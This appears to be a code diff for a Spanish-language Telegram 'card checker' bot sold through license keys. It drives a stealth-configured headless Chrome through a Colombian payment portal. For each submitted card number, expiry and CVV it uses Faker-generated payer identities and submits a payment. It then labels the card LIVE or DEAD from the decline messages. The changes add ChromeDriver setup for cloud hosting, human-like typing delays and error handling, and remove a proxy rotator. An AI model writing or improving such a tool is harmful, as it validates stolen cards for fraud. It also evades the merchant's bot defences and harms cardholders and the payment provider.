@@ -6,6 +6,7 @@
 ║                                                               ║
 ║  Sistema de keys únicas con expiración                       ║
 ║  Owner puede generar keys para clientes                      ║
+║  Optimizado para Koyeb con ChromeDriver manual               ║
 ╚═══════════════════════════════════════════════════════════════╝
 """
 
@@ -18,6 +19,7 @@ import string
 import json
 import threading
 import requests
+import subprocess
 from datetime import datetime, timedelta
 from faker import Faker
 from http.server import HTTPServer, BaseHTTPRequestHandler
@@ -30,7 +32,6 @@ try:
     from selenium import webdriver
     from selenium.webdriver.chrome.service import Service
     from selenium_stealth import stealth
-    from webdriver_manager.chrome import ChromeDriverManager
     from selenium.webdriver.common.by import By
     from selenium.webdriver.support.ui import WebDriverWait
     from selenium.webdriver.support import expected_conditions as EC
@@ -69,6 +70,15 @@ AVAL_URLS = [
 ]
 
 CARDS_PER_URL = 2
+
+# ══════════════════════════════════════════════════════════════
+# LOGGING
+# ══════════════════════════════════════════════════════════════
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
 # ══════════════════════════════════════════════════════════════
 # SISTEMA DE LICENCIAS
@@ -219,115 +229,52 @@ class LicenseManager:
 license_mgr = LicenseManager()
 
 # ══════════════════════════════════════════════════════════════
-# SISTEMA DE PROXIES
+# CHROMEDRIVER SETUP PARA KOYEB
 # ══════════════════════════════════════════════════════════════
 
-class ProxyRotator:
-    """Gestiona proxies gratuitos con rotación"""
-    
-    def __init__(self):
-        self.proxies = []
-        self.current_index = 0
-        self.last_update = 0
-        self.update_interval = 3600
+def setup_chromedriver():
+    """Configura ChromeDriver manualmente para evitar errores de webdriver_manager"""
+    try:
+        # Intentar usar chromedriver del sistema
+        result = subprocess.run(['which', 'chromedriver'], 
+                              capture_output=True, 
+                              text=True)
         
-    def fetch_free_proxies(self):
-        """Obtiene proxies gratuitos"""
-        all_proxies = []
+        if result.returncode == 0:
+            chromedriver_path = result.stdout.strip()
+            logger.info(f"✅ ChromeDriver encontrado: {chromedriver_path}")
+            return chromedriver_path
         
-        # OPTIMIZADO: Solo obtener proxies, sin validación inicial
-        # La validación se hace bajo demanda cuando se usan
-        try:
-            r = requests.get(
-                'https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
-                timeout=10
-            )
-            if r.status_code == 200:
-                proxies = r.text.strip().split('\r\n')
-                all_proxies.extend([p for p in proxies if ':' in p])
-        except:
-            logger.warning("⚠️ No se pudo obtener proxies de proxyscrape")
+        # Si no está en el PATH, intentar ubicaciones comunes
+        common_paths = [
+            '/usr/bin/chromedriver',
+            '/usr/local/bin/chromedriver',
+            '/app/.chromedriver/bin/chromedriver'  # Koyeb buildpack
+        ]
         
-        try:
-            r = requests.get(
-                'https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc',
-                timeout=10
-            )
-            if r.status_code == 200:
-                data = r.json()
-                for proxy in data.get('data', []):
-                    ip = proxy.get('ip')
-                    port = proxy.get('port')
-                    if ip and port:
-                        all_proxies.append(f"{ip}:{port}")
-        except:
-            logger.warning("⚠️ No se pudo obtener proxies de geonode")
+        for path in common_paths:
+            if os.path.exists(path) and os.access(path, os.X_OK):
+                logger.info(f"✅ ChromeDriver encontrado: {path}")
+                return path
         
-        # Eliminar duplicados y limitar a 20 proxies
-        all_proxies = list(set(all_proxies))[:20]
+        logger.error("❌ ChromeDriver no encontrado")
+        return None
         
-        logger.info(f"✅ {len(all_proxies)} proxies cargados (validación bajo demanda)")
-        return all_proxies
-    
-    def _test_proxy(self, proxy):
-        try:
-            proxies = {
-                'http': f'http://{proxy}',
-                'https': f'http://{proxy}'
-            }
-            r = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
-            return r.status_code == 200
-        except:
-            return False
-    
-    def update_proxies(self):
-        """Actualiza proxies de forma asíncrona"""
-        now = time.time()
-        if not self.proxies or (now - self.last_update > self.update_interval):
-            logger.info("🔄 Actualizando proxies en segundo plano...")
-            # Actualizar en thread separado para no bloquear
-            def _async_update():
-                self.proxies = self.fetch_free_proxies()
-                self.last_update = time.time()
-                self.current_index = 0
-            
-            # Si no hay proxies, esperar la primera carga
-            if not self.proxies:
-                _async_update()
-            else:
-                # Si ya hay proxies, actualizar en background
-                threading.Thread(target=_async_update, daemon=True).start()
-    
-    def get_next_proxy(self):
-        self.update_proxies()
-        if not self.proxies:
-            return None
-        proxy = self.proxies[self.current_index % len(self.proxies)]
-        self.current_index += 1
-        return proxy
-
-proxy_rotator = ProxyRotator()
-
-# ══════════════════════════════════════════════════════════════
-# LOGGING
-# ══════════════════════════════════════════════════════════════
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
-
-fake = Faker('es_ES')
+    except Exception as e:
+        logger.error(f"❌ Error buscando ChromeDriver: {e}")
+        return None
 
 # ══════════════════════════════════════════════════════════════
 # ESTADO GLOBAL
 # ══════════════════════════════════════════════════════════════
+
+fake = Faker('es_ES')
+
 class BotState:
     def __init__(self):
         self.checking = {}  # user_id -> bool
         self.stats = {}     # user_id -> stats
-        self.url_index = {}
-        self.cards_on_current_url = {}
+        self.chromedriver_path = None
 
 state = BotState()
 
@@ -351,19 +298,21 @@ def generate_random_document():
     return str(random.randint(10000000, 99999999))
 
 def create_chrome_driver():
-    """Crea instancia de Chrome WebDriver con configuración stealth"""
+    """Crea instancia de Chrome WebDriver con configuración optimizada para Koyeb"""
     try:
         options = webdriver.ChromeOptions()
         
-        # Configuración para Koyeb (ambiente headless)
+        # Configuración headless para servidor
         options.add_argument('--headless=new')
         options.add_argument('--no-sandbox')
         options.add_argument('--disable-dev-shm-usage')
         options.add_argument('--disable-gpu')
+        options.add_argument('--disable-software-rasterizer')
         options.add_argument('--disable-blink-features=AutomationControlled')
         options.add_argument('--disable-extensions')
         options.add_argument('--disable-infobars')
         options.add_argument('--window-size=1920,1080')
+        options.add_argument('--start-maximized')
         
         # User agent realista
         options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
@@ -372,14 +321,23 @@ def create_chrome_driver():
         prefs = {
             'credentials_enable_service': False,
             'profile.password_manager_enabled': False,
-            'profile.default_content_setting_values.notifications': 2
+            'profile.default_content_setting_values.notifications': 2,
+            'profile.managed_default_content_settings.images': 2  # Deshabilitar imágenes para velocidad
         }
         options.add_experimental_option('prefs', prefs)
         options.add_experimental_option('excludeSwitches', ['enable-automation', 'enable-logging'])
         options.add_experimental_option('useAutomationExtension', False)
         
+        # Configurar ChromeDriver
+        if state.chromedriver_path:
+            service = Service(executable_path=state.chromedriver_path)
+            logger.info(f"🚀 Usando ChromeDriver: {state.chromedriver_path}")
+        else:
+            # Fallback: dejar que Selenium lo encuentre
+            service = Service()
+            logger.info("🚀 Usando ChromeDriver del sistema")
+        
         # Crear driver
-        service = Service(ChromeDriverManager().install())
         driver = webdriver.Chrome(service=service, options=options)
         
         # Aplicar stealth
@@ -391,6 +349,10 @@ def create_chrome_driver():
             renderer="Intel Iris OpenGL Engine",
             fix_hairline=True,
         )
+        
+        # Configurar timeouts
+        driver.set_page_load_timeout(30)
+        driver.implicitly_wait(10)
         
         logger.info("✅ Chrome driver creado exitosamente")
         return driver
@@ -404,12 +366,17 @@ def type_into(driver, wait, by, selector, text):
     try:
         field = wait.until(EC.element_to_be_clickable((by, selector)))
         driver.execute_script("arguments[0].scrollIntoView({block:'center'});", field)
+        time.sleep(0.2)
         driver.execute_script("arguments[0].click();", field)
         time.sleep(0.3)
         field.clear()
+        time.sleep(0.1)
+        
+        # Escribir texto con delay natural
         for ch in text:
             field.send_keys(ch)
-            time.sleep(0.04)
+            time.sleep(random.uniform(0.03, 0.08))
+        
         return True
     except Exception as e:
         logger.error(f"Error escribiendo en {selector}: {e}")
@@ -420,7 +387,9 @@ def safe_click(driver, wait, selector, by):
     try:
         btn = wait.until(EC.element_to_be_clickable((by, selector)))
         driver.execute_script("arguments[0].scrollIntoView({block:'center'});", btn)
+        time.sleep(0.3)
         driver.execute_script("arguments[0].click();", btn)
+        time.sleep(0.5)
         return True
     except Exception as e:
         logger.error(f"Error haciendo clic en {selector}: {e}")
@@ -436,99 +405,147 @@ def clear_browser(driver):
             try { window.localStorage.clear(); } catch(e) {}
             try { window.sessionStorage.clear(); } catch(e) {}
         """)
+        logger.info("🧹 Navegador limpiado")
     except Exception as e:
-        logger.warning(f"Error limpiando navegador: {e}")
+        logger.warning(f"⚠️ Error limpiando navegador: {e}")
 
 def detect_result(driver):
     """Detecta el resultado del pago"""
-    # Esperar 14 segundos para que procese
-    time.sleep(14)
+    logger.info("🔍 Esperando resultado de transacción...")
+    time.sleep(12)
     
     # Buscar mensajes de rechazo
     declined_xpaths = [
-        "//h3[contains(text(), 'Negada, Tarjeta no autorizada')]",
-        "//h3[contains(text(), 'SCUDO (Políticas de Control de Riesgos')]",
+        "//h3[contains(text(), 'Negada')]",
+        "//h3[contains(text(), 'SCUDO')]",
+        "//h3[contains(text(), 'rechazada')]",
         "//*[contains(text(),'Transacción Rechazada')]",
-        "//*[contains(text(),'rechazada')]",
+        "//*[contains(text(),'no autorizada')]",
+        "//*[contains(text(),'Tarjeta inválida')]",
     ]
     
     for xpath in declined_xpaths:
         try:
-            el = WebDriverWait(driver, 4).until(
+            el = WebDriverWait(driver, 3).until(
                 EC.presence_of_element_located((By.XPATH, xpath)))
-            msg = el.text
+            msg = el.text.strip()
+            logger.info(f"❌ Transacción rechazada: {msg}")
             return "DEAD", msg
         except TimeoutException:
             continue
     
-    return "LIVE", "Transacción exitosa"
+    # Si no hay mensaje de rechazo, considerar LIVE
+    logger.info("✅ No se detectó rechazo - Posible LIVE")
+    return "LIVE", "Transacción procesada exitosamente"
 
 def gateway_email_step(driver, wait, email):
     """Paso: ingresar email en el gateway"""
-    type_into(driver, wait, By.ID, 'email', email)
-    safe_click(driver, wait, '//button[@aria-label="Continuar" or contains(.,"Continuar")]', By.XPATH)
+    logger.info("📧 Ingresando email...")
+    if type_into(driver, wait, By.ID, 'email', email):
+        return safe_click(driver, wait, '//button[@aria-label="Continuar" or contains(.,"Continuar")]', By.XPATH)
+    return False
 
 def gateway_select_card(driver, wait):
     """Seleccionar método de pago: tarjeta"""
-    wait.until(EC.presence_of_element_located(
-        (By.XPATH, "//h2[contains(text(), 'Selecciona un método de pago')]")))
-    safe_click(driver, wait, "//button[.//span[contains(text(),'Tarjeta de Crédito')]]", By.XPATH)
+    logger.info("💳 Seleccionando método de pago...")
+    try:
+        wait.until(EC.presence_of_element_located(
+            (By.XPATH, "//h2[contains(text(), 'Selecciona un método de pago')]")))
+        time.sleep(1)
+        return safe_click(driver, wait, "//button[.//span[contains(text(),'Tarjeta de Crédito')]]", By.XPATH)
+    except Exception as e:
+        logger.error(f"Error seleccionando tarjeta: {e}")
+        return False
 
 def gateway_card_fields(driver, wait, card_number, expiry, cvv):
     """Rellenar datos de tarjeta"""
-    type_into(driver, wait, By.ID, 'cardNumber', card_number)
-    type_into(driver, wait, By.ID, 'date', expiry)
-    type_into(driver, wait, By.ID, 'cvv', cvv)
-    safe_click(driver, wait, 'button.btn[type="submit"]', By.CSS_SELECTOR)
+    logger.info("🔢 Ingresando datos de tarjeta...")
+    
+    if not type_into(driver, wait, By.ID, 'cardNumber', card_number):
+        return False
+    time.sleep(0.3)
+    
+    if not type_into(driver, wait, By.ID, 'date', expiry):
+        return False
+    time.sleep(0.3)
+    
+    if not type_into(driver, wait, By.ID, 'cvv', cvv):
+        return False
+    time.sleep(0.5)
+    
+    return safe_click(driver, wait, 'button.btn[type="submit"]', By.CSS_SELECTOR)
 
 def gateway_titular(driver, wait, name, surname, doc, phone):
     """Rellenar datos del titular"""
-    type_into(driver, wait, By.ID, 'name', name)
-    type_into(driver, wait, By.ID, 'surname', surname)
+    logger.info("👤 Ingresando datos del titular...")
+    
+    if not type_into(driver, wait, By.ID, 'name', name):
+        return False
+    time.sleep(0.2)
+    
+    if not type_into(driver, wait, By.ID, 'surname', surname):
+        return False
+    time.sleep(0.2)
     
     # Cédula
-    doc_field = WebDriverWait(driver, 15).until(
-        EC.element_to_be_clickable((By.ID, 'document')))
-    driver.execute_script("arguments[0].scrollIntoView({block:'center'});", doc_field)
-    driver.execute_script("arguments[0].click();", doc_field)
-    time.sleep(0.3)
-    doc_field.clear()
-    for ch in doc:
-        doc_field.send_keys(ch)
-        time.sleep(0.04)
+    try:
+        doc_field = wait.until(EC.element_to_be_clickable((By.ID, 'document')))
+        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", doc_field)
+        time.sleep(0.2)
+        driver.execute_script("arguments[0].click();", doc_field)
+        time.sleep(0.3)
+        doc_field.clear()
+        time.sleep(0.1)
+        
+        for ch in doc:
+            doc_field.send_keys(ch)
+            time.sleep(random.uniform(0.03, 0.08))
+    except Exception as e:
+        logger.error(f"Error en documento: {e}")
+        return False
     
     # Teléfono
     try:
-        pf = WebDriverWait(driver, 10).until(
-            EC.element_to_be_clickable((By.CSS_SELECTOR, 'input[name="user.mobile"]')))
+        time.sleep(0.3)
+        pf = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'input[name="user.mobile"]')))
         driver.execute_script("arguments[0].scrollIntoView({block:'center'});", pf)
+        time.sleep(0.2)
         driver.execute_script("arguments[0].click();", pf)
         time.sleep(0.3)
         pf.clear()
+        time.sleep(0.1)
+        
         for ch in phone:
             pf.send_keys(ch)
-            time.sleep(0.04)
-    except Exception:
-        logger.warning("Teléfono: fallback con TAB")
+            time.sleep(random.uniform(0.03, 0.08))
+    except Exception as e:
+        logger.warning(f"⚠️ Error en teléfono: {e}")
+    
+    return True
 
 def gateway_pay_button(driver, wait):
     """Clic en botón de pagar"""
+    logger.info("💰 Procesando pago...")
     try:
-        btn = WebDriverWait(driver, 10).until(
-            EC.element_to_be_clickable(
-                (By.CSS_SELECTOR, 'button[type="submit"][aria-label="Pagar $10.000,00"]')))
+        btn = wait.until(EC.element_to_be_clickable(
+            (By.CSS_SELECTOR, 'button[type="submit"][aria-label*="Pagar"]')))
         driver.execute_script("arguments[0].scrollIntoView({block:'center'});", btn)
+        time.sleep(0.5)
         driver.execute_script("arguments[0].click();", btn)
+        return True
     except Exception:
-        # Fallback
-        btns = driver.find_elements(By.CSS_SELECTOR, 'button[type="submit"]')
-        for btn in btns:
-            try:
+        # Fallback: buscar cualquier botón submit visible
+        try:
+            btns = driver.find_elements(By.CSS_SELECTOR, 'button[type="submit"]')
+            for btn in btns:
                 if btn.is_displayed() and btn.is_enabled():
                     driver.execute_script("arguments[0].click();", btn)
-                    return
-            except:
-                continue
+                    logger.info("✅ Clic en botón pagar (fallback)")
+                    return True
+        except Exception as e:
+            logger.error(f"Error en botón pagar: {e}")
+            return False
+    return False
 
 def process_card_aval(driver, wait, card_number, expiry, cvv):
     """Procesa verificación de tarjeta en Aval"""
@@ -538,44 +555,85 @@ def process_card_aval(driver, wait, card_number, expiry, cvv):
     name = fake.first_name()
     surname = fake.last_name()
     
+    logger.info(f"🚀 Iniciando verificación - Email: {email}")
+    
     try:
         # Limpiar navegador
         clear_browser(driver)
+        
+        # Navegar a Aval
+        logger.info(f"🌐 Navegando a: {URL_AVAL}")
         driver.get(URL_AVAL)
-        time.sleep(6)
+        time.sleep(5)
         
         # Llenar formulario Aval
-        type_into(driver, wait, By.ID, 'decripcion_pago', "PAGO NOMINA")
-        type_into(driver, wait, By.ID, 'description', "AlexisSAS")
-        type_into(driver, wait, By.ID, 'numero_liquidacion', fake.numerify('########'))
-        type_into(driver, wait, By.ID, 'reference', fake.numerify('########'))
-        type_into(driver, wait, By.ID, 'amount', "10000")
+        logger.info("📝 Llenando formulario Aval...")
+        
+        if not type_into(driver, wait, By.ID, 'decripcion_pago', "PAGO NOMINA"):
+            return "ERROR", "Error en descripción pago"
+        
+        if not type_into(driver, wait, By.ID, 'description', "AlexisSAS"):
+            return "ERROR", "Error en description"
+        
+        if not type_into(driver, wait, By.ID, 'numero_liquidacion', fake.numerify('########')):
+            return "ERROR", "Error en número liquidación"
+        
+        if not type_into(driver, wait, By.ID, 'reference', fake.numerify('########')):
+            return "ERROR", "Error en referencia"
+        
+        if not type_into(driver, wait, By.ID, 'amount', "10000"):
+            return "ERROR", "Error en monto"
         
         # Seleccionar moneda
         try:
             Select(wait.until(EC.presence_of_element_located(
                 (By.ID, 'currency')))).select_by_visible_text('Peso colombiano')
-        except:
-            pass
+            time.sleep(0.3)
+        except Exception as e:
+            logger.warning(f"⚠️ Error seleccionando moneda: {e}")
         
-        type_into(driver, wait, By.ID, 'payer_email', email)
-        type_into(driver, wait, By.ID, 'buyer_cell_phone', phone)
+        if not type_into(driver, wait, By.ID, 'payer_email', email):
+            return "ERROR", "Error en email pagador"
+        
+        if not type_into(driver, wait, By.ID, 'buyer_cell_phone', phone):
+            return "ERROR", "Error en teléfono"
         
         # Botón Pagar
-        safe_click(driver, wait, "//button[normalize-space()='Pagar' or @aria-label='Pagar']", By.XPATH)
+        logger.info("🔘 Clic en botón Pagar...")
+        if not safe_click(driver, wait, "//button[normalize-space()='Pagar' or @aria-label='Pagar']", By.XPATH):
+            return "ERROR", "Error en botón Pagar"
+        
+        time.sleep(3)
         
         # Gateway de pago
-        gateway_email_step(driver, wait, email)
-        gateway_select_card(driver, wait)
-        gateway_card_fields(driver, wait, card_number, expiry, cvv)
-        gateway_titular(driver, wait, name, surname, doc, phone)
-        gateway_pay_button(driver, wait)
+        if not gateway_email_step(driver, wait, email):
+            return "ERROR", "Error en paso email gateway"
+        
+        time.sleep(2)
+        
+        if not gateway_select_card(driver, wait):
+            return "ERROR", "Error seleccionando tarjeta"
+        
+        time.sleep(2)
+        
+        if not gateway_card_fields(driver, wait, card_number, expiry, cvv):
+            return "ERROR", "Error en campos de tarjeta"
+        
+        time.sleep(2)
+        
+        if not gateway_titular(driver, wait, name, surname, doc, phone):
+            return "ERROR", "Error en datos del titular"
+        
+        time.sleep(1)
+        
+        if not gateway_pay_button(driver, wait):
+            return "ERROR", "Error en botón pagar final"
         
         # Detectar resultado
         return detect_result(driver)
         
     except Exception as e:
-        logger.error(f"Error en verificación: {e}")
+        logger.error(f"❌ Error crítico en verificación: {e}")
         return "ERROR", str(e)
 
 # ══════════════════════════════════════════════════════════════
@@ -716,7 +774,6 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "`/check` - Verificar tarjetas\n"
             "`/status` - Ver tus estadísticas\n"
             "`/mykey` - Info de tu licencia\n"
-            "`/proxies` - Estado de proxies\n"
             "`/help` - Ayuda completa"
         )
     else:
@@ -774,7 +831,9 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if not text:
         await update.message.reply_text(
-            "❌ Formato: `/check CC|MM|YY|CVV`",
+            "❌ Formato: `/check CC|MM|YY|CVV`\n\n"
+            "**Ejemplo:**\n"
+            "`/check 5424181655740251|03|28|532`",
             parse_mode='Markdown'
         )
         return
@@ -814,8 +873,9 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Inicializar driver de Selenium
     driver = None
     try:
+        logger.info(f"👤 Usuario {user_id} iniciando check de {len(cards)} tarjeta(s)")
         driver = create_chrome_driver()
-        wait = WebDriverWait(driver, 20)
+        wait = WebDriverWait(driver, 25)
         
         for cc, mm, yy, cvv in cards:
             masked = f"{cc[:4]}****{cc[-4:]}"
@@ -856,7 +916,7 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
     
     except Exception as e:
-        logger.error(f"Error crítico en checking: {e}")
+        logger.error(f"❌ Error crítico en checking: {e}", exc_info=True)
         await update.message.reply_text(
             f"⚠️ Error: {str(e)}",
             parse_mode='Markdown'
@@ -865,8 +925,9 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if driver:
             try:
                 driver.quit()
-            except:
-                pass
+                logger.info("🔒 Driver cerrado")
+            except Exception as e:
+                logger.error(f"Error cerrando driver: {e}")
 
 @require_license
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -888,24 +949,10 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(msg, parse_mode='Markdown')
 
-@require_license
-async def proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Info de proxies"""
-    proxy_rotator.update_proxies()
-    
-    msg = (
-        f"🌐 **PROXIES**\n\n"
-        f"✅ Activos: {len(proxy_rotator.proxies)}\n"
-        f"🔄 Próximo: {proxy_rotator.current_index % len(proxy_rotator.proxies) + 1 if proxy_rotator.proxies else 0}\n\n"
-        f"Actualización automática cada hora"
-    )
-    
-    await update.message.reply_text(msg, parse_mode='Markdown')
-
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Ayuda"""
     msg = (
-        "📖 **AYUDA**\n\n"
+        "📖 **AYUDA - AVAL CHECKER BOT**\n\n"
         "**Activar licencia:**\n"
         "`/redeem AVAL-XXXX-XXXX-XXXX`\n\n"
         "**Checkear tarjetas:**\n"
@@ -913,7 +960,9 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "**Ver info:**\n"
         "`/mykey` - Tu licencia\n"
         "`/status` - Tus stats\n"
-        "`/proxies` - Proxies activos"
+        "`/start` - Menú principal\n\n"
+        "**Soporte:**\n"
+        "Contacta al owner para obtener licencias"
     )
     
     await update.message.reply_text(msg, parse_mode='Markdown')
@@ -930,7 +979,8 @@ class HealthCheckHandler(BaseHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b'OK - Bot is running')
+        response = f'OK - Bot running - ChromeDriver: {state.chromedriver_path or "system"}'
+        self.wfile.write(response.encode())
     
     def log_message(self, format, *args):
         """Silenciar logs del servidor HTTP"""
@@ -954,17 +1004,26 @@ def main():
         print("❌ Configura BOT_TOKEN")
         sys.exit(1)
     
+    print("=" * 70)
+    print("🤖 AVAL CHECKER BOT - INICIANDO")
+    print("=" * 70)
+    
+    # Configurar ChromeDriver
+    print("🔧 Configurando ChromeDriver...")
+    state.chromedriver_path = setup_chromedriver()
+    
+    if state.chromedriver_path:
+        print(f"✅ ChromeDriver listo: {state.chromedriver_path}")
+    else:
+        print("⚠️ ChromeDriver no encontrado, usando modo automático")
+    
     # Iniciar health check server en background
     health_thread = threading.Thread(target=start_health_server, daemon=True)
     health_thread.start()
-    time.sleep(1)  # Dar tiempo al servidor a iniciar
+    time.sleep(1)
     
-    print("🤖 Iniciando Aval Bot con Sistema de Licencias...")
     print(f"👑 Owner ID: {OWNER_ID}")
-    
-    # OPTIMIZADO: No bloquear el inicio esperando proxies
-    # Se cargan en segundo plano cuando se necesiten
-    print("🌐 Proxies se cargarán cuando sean necesarios...")
+    print("=" * 70)
     
     app = Application.builder().token(BOT_TOKEN).build()
     
@@ -979,20 +1038,11 @@ def main():
     app.add_handler(CommandHandler("mykey", mykey_command))
     app.add_handler(CommandHandler("check", check_command))
     app.add_handler(CommandHandler("status", status_command))
-    app.add_handler(CommandHandler("proxies", proxies_command))
     app.add_handler(CommandHandler("help", help_command))
     
     print("✅ Bot activo con sistema de licencias")
     print("💡 Usa /genkey para generar keys")
-    
-    # Cargar proxies en segundo plano después de iniciar
-    def load_proxies_async():
-        time.sleep(5)  # Esperar 5s después del inicio
-        logger.info("🔄 Cargando proxies en segundo plano...")
-        proxy_rotator.update_proxies()
-        logger.info(f"✅ {len(proxy_rotator.proxies)} proxies listos")
-    
-    threading.Thread(target=load_proxies_async, daemon=True).start()
+    print("=" * 70)
     
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
